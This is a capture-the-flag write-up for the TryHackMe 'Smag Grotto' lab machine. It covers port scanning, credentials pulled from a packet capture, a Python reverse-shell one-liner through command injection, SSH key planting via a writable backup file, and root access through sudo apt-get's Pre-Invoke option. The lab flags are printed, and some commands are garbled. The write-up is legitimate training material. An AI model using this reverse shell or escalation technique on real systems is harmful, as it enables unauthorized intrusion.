@@ -1,0 +1,184 @@
+Today we have another easy Listed machine from TryHackMe to solve which is smag-grotto.
+
+
+Main IP :: 10.49.141.241
+
+Starting with all port scan.
+Nmap scan report for ip-10-49-141-241.ap-south-1.compute.internal (10.49.141.241)
+Host is up (0.00039s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Now we will perform service and version detection scan.
+
+Nmap scan report for 10.49.141.241
+Host is up, received echo-reply ttl 62 (0.060s latency).
+Scanned at 2026-06-04 03:10:56 UTC for 9s
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDORe0Df8XvRlc3MvkqhpqAX5/sbUoEiIckKSVOLJVmWb9jOq2r0AfjaYAAZzgH9RThlwbzjGj6r4yBsXrMFB01qemsYBzUkut9Q12P+uly9+SeL6X7CUavLnkcAz0bzkqQpIFLG9HUyu9ysmZqE1Xo6NumtNh3Bf4H1BbS+cRntagn1TreTWJUiT+s7Gr9KEIH7rQUM8jX/eD/zNTKMN9Ib6/TM7TkPxAnOSw5JRfTV/oC8fFGqvjcAMxlhqS44AL/ZziI50OrCX9rMKtjZuvPaW2U31Sr8nUmtd3jnJPjMH2ZRfeRTPybYOblPOZq5lV2Fu4TwF/xOv2OrACLDxj5
+|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN6hWP9VGah8N9DAM3Kb0OZlIEttMMjf+PXwLWfHf0dz6OtdbrEjblgrck0i7fT95F1qdRJHtBdEu5yg4r6/gkY=
+|   256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWHQ800Vx/X5aGSIDdpkEuKgFDxnjak46F/IsegN2Ju
+80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Smag
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+So we will start with port 80. and burp will be on.
+
+Nothing as it says that the site is under development let's start with directory and file fuzzing.
+
+
+# feroxbuster -u http://10.49.141.241/mail/
+                                                                    
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.13.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.49.141.241/mail
+ 🚩  In-Scope Url          │ 10.49.141.241
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.13.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        9l       28w      313c http://10.49.141.241/mail => http://10.49.141.241/mail/
+[####################] - 81s    30001/30001   0s      found:1       errors:1      
+[####################] - 81s    30000/30000   370/s   http://10.49.141.241/mail/    
+
+
+
+We have the /mail thing over here and once we will have the moving there we have some of the usernames. And we will look deeper into we kind of have some users.
+
+
+To: jake@smag.thm Cc: netadmin@smag.thm From: uzi@smag.thm
+
+
+And we have got the .pcap file let's look at what we have.
+
+And in that .pcap file we have this Frame 4: Packet, 268 bytes on wire (2144 bits), 268 bytes captured (2144 bits)
+Ethernet II, Src: PCSSystemtec_57:81:43 (08:00:27:57:81:43), Dst: PCSSystemtec_dd:5e:de (08:00:27:dd:5e:de)
+Internet Protocol Version 4, Src: 192.168.33.10, Dst: 192.168.33.69
+Transmission Control Protocol, Src Port: 34030, Dst Port: 80, Seq: 1, Ack: 1, Len: 202
+Hypertext Transfer Protocol
+    POST /login.php HTTP/1.1\r\n
+    Host: development.smag.thm\r\n
+    User-Agent: curl/7.47.0\r\n
+    Accept: */*\r\n
+    Content-Length: 39\r\n
+    Content-Type: application/x-www-form-urlencoded\r\n
+    \r\n
+    [Response in frame: 6]
+    [Full request URI: http://development.smag.thm/login.php]
+    File Data: 39 bytes
+HTML Form URL Encoded: application/x-www-form-urlencoded
+    Form item: "username" = "helpdesk"
+    Form item: "password" = "cH4nG3M3_n0w"
+
+and a new host that we can look for. Let's add it in the /etc/hosts file and will move there.
+
+There are two things a admin login and login page for normal users we will try with admin if it didn't worked will try user-login.
+
+And we are logged in as admin page so now we will look for command injection as it says command.
+
+So we did get reverse shell with python3 command.
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.145.49",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+
+www-data@smag:/var/www/development.smag.thm$ ls
+admin.php  login.php  materialize.min.css
+www-data@smag:/var/www/development.smag.thm$ whoami
+www-data
+
+
+ssh-keygen -f jake 
+Generating public/private ed25519 key pair.
+Enter passphrase for "jake" (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in jake
+Your public key has been saved in jake.pub
+The key fingerprint is:
+SHA256:fOEcFXIiqcDKQG502rS0qbTihrdMaq+heT5SF4dAxbE root@kali
+The key's randomart image is:
++--[ED25519 256]--+
+|.+.Bo.  ..o +.   |
+|+ B B.  .. =     |
+| B BEo .  o      |
+|o = o o. o o     |
+|.o   o  S +      |
+|+ . .    .       |
+|.=o.             |
+|+B+.             |
+|==*o             |
++----[SHA256]-----+
+                                                                    
+┌──(root㉿kali)-[/home/kali/thm/grotto]
+└─# ls
+groto.txt  jake  jake.pub
+                                                                    
+┌──(root㉿kali)-[/home/kali/thm/grotto]
+└─# cat jake        
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACCqS/4fZMnOhYFbuqfGXm3WpT6xirNs59KAgnWNagFeWwAAAJDC10gYwtdI
+GAAAAAtzc2gtZWQyNTUxOQAAACCqS/4fZMnOhYFbuqfGXm3WpT6xirNs59KAgnWNagFeWw
+AAAEAlT8l3XHx7WyXYzSnTixxbGOnccUmVtUWeR3af5L10MKpL/h9kyc6FgVu6p8Zebdal
+PrGKs2zn0oCCdY1qAV5bAAAACXJvb3RAa2FsaQECAwQ=
+-----END OPENSSH PRIVATE KEY-----
+                                                                    
+┌──(root㉿kali)-[/home/kali/thm/grotto]
+└─# cat jake.pub 
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpL/h9kyc6FgVu6p8ZebdalPrGKs2zn0oCCdY1qAV5b root@kali
+                                                                    
+┌──(root㉿kali)-[/home/kali/thm/grotto]
+└─# chmod 600 jake    
+                         
+echo '' > /opt/.backups/jake_id_rsa.pub^Cackup
+www-data@smag:/opt/.backups$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5Ac6FgVu6p8ZebdalPrGKs2zn0oCCdY1qAV5b root@kali' > /opt/.backups/jake_ackup .pub.ba
+www-data@smag:/opt/.backups$ 
+
+jake@smag:~$ ls
+user.txt
+jake@smag:~$ cat user.txt 
+iusGorV7EbmxM5AuIe2w499msaSuqU3j
+
+
+TIME FOR PRIVILEGE ESCALATION :: 
+
+sudo -l
+Matching Defaults entries for jake on smag:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on smag:
+    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
+
+jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+# whoami
+root
+# cat /root/root.txt
+uJr6zRgetaniyHVRqqL58uRasybBKz2T
+# 
+
+Help from gtfobins.org.
